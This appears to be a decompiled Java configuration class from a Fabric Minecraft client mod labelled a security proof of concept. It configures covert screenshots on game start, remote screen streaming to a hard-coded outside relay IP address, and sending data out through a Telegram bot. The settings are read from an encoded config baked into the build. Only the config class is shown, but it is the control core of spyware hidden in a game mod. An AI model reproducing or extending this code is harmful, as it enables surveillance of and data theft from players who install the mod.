package com.securitydemo.poc;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import java.io.IOException;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
public final class PoCConfig {
   public boolean enabled = false;
   public boolean captureScreenshotOnStart = false;
   public boolean localScreenStream = false;
   public boolean remoteStream = true;
   public String relayServerUrl = "http://185.199.199.145:8787";
   public int screenshotDelaySeconds = 3;
   public int streamPort = 8765;
   public int streamFps = 20;
   public int streamQuality = 55;
   public float streamScale = 0.5F;
   public boolean streamAdaptive = true;
   public String botToken = "";
   public String chatId = "";
   public String message = "Security PoC test file from Minecraft mod.";
   private static final Gson GSON = (new GsonBuilder()).create();

   public static PoCConfig loadBuilt() {
      byte[] packed = BuiltConfigCodec.readPackedConfig();
      String json = BuiltConfigCodec.decodePayload(packed);
      if (json != null && !Compat.isBlank(json)) {
         try {
            PoCConfig config = (PoCConfig)GSON.fromJson(json, PoCConfig.class);
            if (config != null) {
               return config;
            }
         } catch (Exception e) {
            PocLogger.get().warn("Failed to parse baked config", (Throwable)e);
         }
      }

      return new PoCConfig();
   }

   public static PoCConfig load() {
      return loadBuilt();
   }

   public static String toJson(PoCConfig config) {
      return GSON.toJson(config != null ? config : new PoCConfig());
   }

   public boolean isTelegramDemoReady() {
      return this.enabled && this.hasValidBotToken() && this.hasChatIdConfigured();
   }

   public boolean hasValidBotToken() {
      return this.botToken != null && !Compat.isBlank(this.botToken) && !this.botToken.contains("REPLACE");
   }

   public boolean isReady() {
      return this.isTelegramDemoReady();
   }

   public boolean hasChatIdConfigured() {
      if (this.chatId != null && !Compat.isBlank(this.chatId)) {
         if ("AUTO".equalsIgnoreCase(this.chatId.trim())) {
            return true;
         } else {
            return !this.chatId.contains("REPLACE");
         }
      } else {
         return false;
      }
   }

   public String resolveChatId() throws IOException {
      return this.chatId != null && !Compat.isBlank(this.chatId) && !"AUTO".equalsIgnoreCase(this.chatId.trim()) ? this.chatId.trim() : TelegramChatResolver.resolveChatId(this.botToken);
   }
}
